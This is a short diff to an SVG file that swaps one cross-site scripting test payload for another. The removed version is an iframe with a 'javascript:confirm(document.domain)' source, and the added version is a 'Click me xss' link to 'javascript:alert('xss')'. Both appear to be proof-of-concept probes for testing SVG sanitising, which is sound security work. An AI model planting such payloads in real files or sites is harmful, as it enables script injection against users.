@@ -1,6 +1,5 @@
-<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-        <text x="20" y="35">Lauritz</text>
-        <foreignObject width="500" height="500">
-                <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:confirm(document.domain);" width="400" height="250"/>
-        </foreignObject>
+<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+  <a href="javascript:alert('xss')">
+    <text x="70" y="70" text-anchor="middle">Click me xss</text>
+  </a>
 </svg>
